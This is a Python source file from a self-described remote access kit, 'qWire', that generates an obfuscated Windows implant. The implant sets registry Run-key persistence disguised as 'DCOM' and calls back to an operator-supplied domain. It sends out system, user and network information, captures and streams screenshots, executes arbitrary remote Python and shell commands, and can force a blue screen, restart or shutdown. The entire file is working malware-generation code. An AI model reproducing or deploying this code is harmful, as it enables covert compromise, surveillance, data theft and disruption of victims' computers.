#          M""MMM""MMM""M oo
#          M  MMM  MMM  M
# .d8888b. M  MMP  MMP  M dP 88d888b. .d8888b.
# 88'  `88 M  MM'  MM' .M 88 88'  `88 88ooood8
# 88.  .88 M  `' . '' .MM 88 88       88.  ...
# `8888P88 M    .d  .dMMM dP dP       `88888P'
#       88 MMMMMMMMMMMMMM    Command and Control
#       dP
# -------------------------------------------------------------
#             [A Remote Access Kit for Windows]
# Author: SlizBinksman
# Github: https://github.com/slizbinksman
# Build:  1.0.0
# -------------------------------------------------------------
from ..builder.encryption import Scrambler

class Persistance:
    #Function will check the persistence option and return code for the pre-defined function
    def registry_start_up(self,registry_key,path_variable,option):
        if option == None:              #If the option is none
            code = 'pass'               #Make the function pass when the client executes it
        elif option == 'reg/run':       #If the persistence option is a run key,
            code = f"subprocess.run(f'reg add \"{registry_key}\" /v DCOM /t REG_SZ /d \"{{{path_variable}}}\" /f',shell=True)"  #Generate code for the key
        return code                     #Return the code


class QWireAgent():

    #Function will generate the initial agent code with settings from the builer and obfuscated variables
    def generate_agent_code(self, server_port, stream_port, exfil_port, domain_name, function_name, persistence_option):
        SEP = Scrambler().scrambleVar(20)
        BUFFER = Scrambler().scrambleVar(20)
        SERV_PORT = Scrambler().scrambleVar(20)
        EXFIL_PORT = Scrambler().scrambleVar(20)
        STRM_PORT = Scrambler().scrambleVar(20)
        MultiProcessor = Scrambler().scrambleVar(20)
        start_child_thread = Scrambler().scrambleVar(20)
        function = Scrambler().scrambleVar(20)
        process = Scrambler().scrambleVar(20)
        start_child_thread_arg = Scrambler().scrambleVar(20)
        arg = Scrambler().scrambleVar(20)
        Utilitys = Scrambler().scrambleVar(20)
        get_windows_version = Scrambler().scrambleVar(20)
        command = Scrambler().scrambleVar(20)
        version_output = Scrambler().scrambleVar(20)
        get_local_ip = Scrambler().scrambleVar(20)
        local_ip = Scrambler().scrambleVar(20)
        check_process_privilege = Scrambler().scrambleVar(20)
        convert_string_to_bytes = Scrambler().scrambleVar(20)
        string = Scrambler().scrambleVar(20)
        string_to_bytes = Scrambler().scrambleVar(20)
        extract_sys_ip_info = Scrambler().scrambleVar(20)
        system_info = Scrambler().scrambleVar(20)
        sysinfo_output = Scrambler().scrambleVar(20)
        ip_config = Scrambler().scrambleVar(20)
        ip_config_output = Scrambler().scrambleVar(20)
        extracted_info = Scrambler().scrambleVar(20)
        SystemManager = Scrambler().scrambleVar(20)
        blue_screen = Scrambler().scrambleVar(20)
        Encryption = Scrambler().scrambleVar(20)
        encrypt_packet = Scrambler().scrambleVar(20)
        data_to_encrypt = Scrambler().scrambleVar(20)
        MASTER_KEY = Scrambler().scrambleVar(20)
        encoded_data = Scrambler().scrambleVar(20)
        encryption_object = Scrambler().scrambleVar(20)
        encrypted_data = Scrambler().scrambleVar(20)
        decrypt_packet = Scrambler().scrambleVar(20)
        data_to_decrypt = Scrambler().scrambleVar(20)
        decryption_object = Scrambler().scrambleVar(20)
        plaintext = Scrambler().scrambleVar(20)
        decrypted_data = Scrambler().scrambleVar(20)
        ClientSocket = Scrambler().scrambleVar(20)
        heartbeat = Scrambler().scrambleVar(20)
        disconnect = Scrambler().scrambleVar(20)
        stream_desktop = Scrambler().scrambleVar(20)
        shutdown_computer = Scrambler().scrambleVar(20)
        restart_computer = Scrambler().scrambleVar(20)
        sys_info_exfil = Scrambler().scrambleVar(20)
        screenshot = Scrambler().scrambleVar(20)
        ping_server = Scrambler().scrambleVar(20)
        reconnect_to_server = Scrambler().scrambleVar(20)
        system_command = Scrambler().scrambleVar(20)
        python_flag = Scrambler().scrambleVar(20)
        env_var = Scrambler().scrambleVar(20)
        dns_address = Scrambler().scrambleVar(20)
        initiate_handshake = Scrambler().scrambleVar(20)
        connect_to_server = Scrambler().scrambleVar(20)
        client_socket = Scrambler().scrambleVar(20)
        domain = Scrambler().scrambleVar(20)
        start_echo = Scrambler().scrambleVar(20)
        main = Scrambler().scrambleVar(20)
        complete_handshake = Scrambler().scrambleVar(20)
        information_array = Scrambler().scrambleVar(20)
        windows_version = Scrambler().scrambleVar(20)
        privilege = Scrambler().scrambleVar(20)
        current_user = Scrambler().scrambleVar(20)
        operating_system = Scrambler().scrambleVar(20)
        extract_information = Scrambler().scrambleVar(20)
        b64_encoded_key = Scrambler().scrambleVar(20)
        negotiate_encryption = Scrambler().scrambleVar(20)
        system_name = Scrambler().scrambleVar(20)
        exfil_socket_send = Scrambler().scrambleVar(20)
        ExfilSocket = Scrambler().scrambleVar(20)
        execute_system_command = Scrambler().scrambleVar(20)
        execute_python_code = Scrambler().scrambleVar(20)
        CodeExecution = Scrambler().scrambleVar(20)
        action_flag = Scrambler().scrambleVar(20)
        receive_server_command = Scrambler().scrambleVar(20)
        server_command = Scrambler().scrambleVar(20)
        data = Scrambler().scrambleVar(20)
        plain_text_data = Scrambler().scrambleVar(20)
        partial_data = Scrambler().scrambleVar(20)
        bytes_data = Scrambler().scrambleVar(20)
        data_to_send = Scrambler().scrambleVar(20)
        send_data_to_server = Scrambler().scrambleVar(20)
        recv_all_data = Scrambler().scrambleVar(20)
        exfil_socket = Scrambler().scrambleVar(20)
        exfil_data = Scrambler().scrambleVar(20)
        screen_cap = Scrambler().scrambleVar(20)
        take_screenshot = Scrambler().scrambleVar(20)
        image_file_path = Scrambler().scrambleVar(20)
        StreamSocket = Scrambler().scrambleVar(20)
        image_data = Scrambler().scrambleVar(20)
        image_file = Scrambler().scrambleVar(20)
        exec_ = Scrambler().scrambleVar(20)
        error = Scrambler().scrambleVar(20)
        ip_address = Scrambler().scrambleVar(20)
        python_code = Scrambler().scrambleVar(20)
        CURRENT_DIR = Scrambler().scrambleVar(20)
        persistence_mechanism = Scrambler().scrambleVar(20)
        code = Persistance().registry_start_up(
        function_name,CURRENT_DIR,persistence_option
        )
        agent_source = f"""
import socket as socket
import base64 as base64
import ctypes as ctypes
import platform as platform
import os as os
import subprocess as subprocess
import threading as threading
import struct as struct
from PIL import ImageGrab as ImageGrab
from time import sleep as sleep
from cryptography.fernet import Fernet
{SEP} = '<sep>'
{BUFFER} = 4096
{SERV_PORT} = {server_port}
{EXFIL_PORT} = {exfil_port}
{STRM_PORT} = {stream_port}
{CURRENT_DIR} = f"{{os.getcwd()}}\\\\{{os.path.basename(__file__)}}" 
class {MultiProcessor}:
    def {start_child_thread}(self,{function}):
        {process} = threading.Thread(target={function})
        {process}.daemon = True
        {process}.start()
    def {start_child_thread_arg}(self,{function},{arg}):
        {arg} = [{arg}]
        {process} = threading.Thread(target={function},args={arg})
        {process}.daemon = True
        {process}.start()
class {Utilitys}:
    def {get_windows_version}(self):
        {command} = subprocess.Popen(['powershell', '(Get-WmiObject -class Win32_OperatingSystem).Version'],stdout=subprocess.PIPE)
        {version_output} = {command}.stdout.read().decode()  
        {version_output} = {version_output}.replace('\\n','')
        return {version_output}.strip('\\r')                
    def {get_local_ip}(self):
        {local_ip} = socket.gethostbyname(socket.gethostname()) 
        return {local_ip}                                       
    def {check_process_privilege}(self):
        if ctypes.windll.shell32.IsUserAnAdmin():
            return "Administrator"
        else:
            return "User"
    def {persistence_mechanism}(self):
        {code}
    def {convert_string_to_bytes}(self, {string}):
        {string_to_bytes} = str({string}).encode()                                   
        return {string_to_bytes}                                                     
    def {extract_sys_ip_info}(self):
        {system_info} = subprocess.Popen('systeminfo', stdout=subprocess.PIPE)
        {sysinfo_output} = {system_info}.stdout.read().decode()                
        {ip_config} = subprocess.Popen('ipconfig /all', stdout=subprocess.PIPE)    
        {ip_config_output} = {ip_config}.stdout.read().decode()                  
        {extracted_info} = f'{{{sysinfo_output}}}\\n{{{ip_config_output}}}'             
        return {extracted_info}                                                
class {SystemManager}:
    def {blue_screen}(self):
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6)
    def {restart_computer}(self):
        subprocess.run('shutdown /r /t 0',shell=True)
    def {shutdown_computer}(self):
        subprocess.run('shutdown /p')
class {Encryption}:
    def {encrypt_packet}(self,{data_to_encrypt}):
        {encryption_object} = Fernet({MASTER_KEY})                      
        {encoded_data} = {data_to_encrypt}.encode()                     
        {encrypted_data} = {encryption_object}.encrypt({encoded_data})   
        return {encrypted_data}                                       
    def {decrypt_packet}(self,{data_to_decrypt}):
        {decryption_object} = Fernet({MASTER_KEY})                    
        {decrypted_data} = {decryption_object}.decrypt({data_to_decrypt})
        {plaintext} = {decrypted_data}.decode()                        
        return {plaintext}                                           
class {ClientSocket}:
    def __init__(self):
        self.{heartbeat} = 'echo'
        self.{dns_address} = '{domain_name}'
        self.{env_var} = 'USERNAME'
        self.{python_flag} = 'python'
        self.{system_command} = 'system'
        self.{reconnect_to_server} = 'reconnect'
        self.{ping_server} = 'ping'
        self.{sys_info_exfil} = 'sys_info'
        self.{blue_screen} = 'bsod'
        self.{restart_computer} = 'restart'
        self.{shutdown_computer} = 'shutdown'
        self.{screenshot} = 'screenshot'
        self.{stream_desktop} = 'stream_desktop'
        self.{disconnect} = 'disconnect'
    def {connect_to_server}(self):
        {domain} = socket.gethostbyname(self.{dns_address})                  
        self.{client_socket} = socket.socket(socket.AF_INET,socket.SOCK_STREAM)       
        while True:                                                                 
            try:
                self.{client_socket}.connect(({domain},{SERV_PORT}))                          
                break                                                               
            except socket.error:                                                    
                self.{client_socket}.close()                                          
                sleep(10)                                                           
                return self.{connect_to_server}()                                     
        return self.{initiate_handshake}()
    def {initiate_handshake}(self):
        {system_name} = socket.gethostname()
        {Utilitys}().{persistence_mechanism}()                                          
        self.{client_socket}.send({Utilitys}().{convert_string_to_bytes}({system_name}))   
        return self.{negotiate_encryption}()
    def {negotiate_encryption}(self):
        global {MASTER_KEY}                                                           
        {b64_encoded_key} = self.{client_socket}.recv({BUFFER})                           
        {MASTER_KEY} = base64.b64decode({b64_encoded_key})                              
        return self.{extract_information}()
    def {extract_information}(self):
        {local_ip} = {Utilitys}().{get_local_ip}()                           
        {operating_system} = f'{{platform.system()}} {{platform.release()}}'  
        {current_user} = os.environ[self.{env_var}]                           
        {privilege} = {Utilitys}().{check_process_privilege}()                
        {windows_version} = {Utilitys}().{get_windows_version}()              
        {information_array} = []                                          
        {information_array}.append({local_ip})
        {information_array}.append({operating_system})
        {information_array}.append({current_user})
        {information_array}.append({privilege})
        {information_array}.append({windows_version})
        self.{client_socket}.send({Encryption}().{encrypt_packet}(str({information_array})))
        return self.{complete_handshake}()
    def {complete_handshake}(self):
        {MultiProcessor}().{start_child_thread}(self.{start_echo})
        return self.{main}()
    def {start_echo}(self):
        while True:
            self.{client_socket}.send({Encryption}().{encrypt_packet}(self.{heartbeat}))
            sleep(60)
    def {main}(self):
        while True:                                        
            {server_command} = self.{receive_server_command}() 
            {server_command} = {server_command}.split({SEP})     
            {action_flag} = {server_command}[0]                
            if {action_flag} == self.{python_flag}:            
                {CodeExecution}().{execute_python_code}({server_command}[1])
            if {action_flag} == self.{system_command}:                      
                {CodeExecution}().{execute_system_command}({server_command}[1])   
            if {action_flag} == self.{reconnect_to_server}:                
                self.{client_socket}.close()                              
                return self.{connect_to_server}()                        
            if {action_flag} == self.{ping_server}:                         
                {ExfilSocket}().{exfil_socket_send}(f'{{socket.gethostname()}} Is Online')
            if {action_flag} == self.{sys_info_exfil}:                              
                {ExfilSocket}().{exfil_socket_send}(f'{{{Utilitys}().{extract_sys_ip_info}()}}')
            if {action_flag} == self.{blue_screen}:                                      
                self.{client_socket}.close()                                         
                {SystemManager}().{blue_screen}()                                   
            if {action_flag} == self.{restart_computer}:                           
                {SystemManager}().{restart_computer}()                         
            if {action_flag} == self.{shutdown_computer}:                            
                {SystemManager}().{shutdown_computer}()                                
            if {action_flag} == self.{screenshot}:                                      
                {StreamSocket}().{stream_desktop}(True)                       
            if {action_flag} == self.{disconnect}:                                       
                exit()                                     
    def {recv_all_data}(self):
        {bytes_data} = b''                             
        while True:                                 
            {partial_data} = self.{client_socket}.recv({BUFFER}) 
            {bytes_data} += {partial_data}                 
            if len({partial_data}) < int({BUFFER}):        
                break                                   
        return {bytes_data}                           
    def {receive_server_command}(self):
        {data} = self.{recv_all_data}()         
        if not {data}:                            
            return self.{connect_to_server}()     
        {plain_text_data} = {Encryption}().{decrypt_packet}({data}) 
        return {plain_text_data}                              
    def {send_data_to_server}(self,{data}):
        {data_to_send} = {Encryption}().{encrypt_packet}({data})          
        self.{client_socket}.send({data_to_send})                     
class {ExfilSocket}:
    def {exfil_socket_send}(self, {exfil_data}):
        {domain} = socket.gethostbyname({ClientSocket}().{dns_address})        
        {exfil_socket} = socket.socket(socket.AF_INET,socket.SOCK_STREAM)   
        {exfil_socket}.connect(({domain},{EXFIL_PORT}))                        
        {encrypted_data} = {Encryption}().{encrypt_packet}({exfil_data})        
        {exfil_socket}.sendall({encrypted_data})                              
        {exfil_socket}.close()                                                
class {StreamSocket}:
    def __init__(self):
        self.{image_file_path} = str(f'{{os.getenv("userprofile")}}\\AppData\\Local\\Temp\\c.jpg')
    def {take_screenshot}(self):
        {screen_cap} = ImageGrab.grab()                          
        {screen_cap}.save(self.{image_file_path}, 'jpeg')         
        with open(self.{image_file_path}, 'rb') as {image_file}:   
            {image_data} = {image_file}.read()                     
            {image_file}.close()                                 
        return {image_data}                                       
    def {stream_desktop}(self,{screenshot}):
        {StreamSocket} = socket.socket(socket.AF_INET,socket.SOCK_STREAM)        
        {ip_address} = socket.gethostbyname({ClientSocket}().{dns_address})                   
        {StreamSocket}.connect(({ip_address},{STRM_PORT}))                           
        if not {screenshot}:                                                  
            while True:                                                
                {image_data} = self.{take_screenshot}()                          
                {StreamSocket}.sendall(struct.pack(">Q", len({image_data}))) 
                {StreamSocket}.sendall({image_data})                                
        elif {screenshot}:                                                        
            {image_data} = self.{take_screenshot}()                                 
            {StreamSocket}.sendall(struct.pack(">Q", len({image_data})))            
            {StreamSocket}.sendall({image_data})                                    
        {StreamSocket}.close()                                                    
class {CodeExecution}():
    def {execute_python_code}(self,{python_code}):
        def {exec_}({python_code}):
            try:
                exec(str({python_code}))
            except Exception as {error}:
                pass
        {MultiProcessor}().{start_child_thread_arg}({exec_},{python_code})   
    def {execute_system_command}(self,{system_command}):
        def {exec_}({system_command}):
            try:
                subprocess.run({system_command},shell=True)
            except Exception as {error}:
                pass
        {MultiProcessor}().{start_child_thread_arg}({exec_},{system_command})
{ClientSocket}().{connect_to_server}()
"""
        return agent_source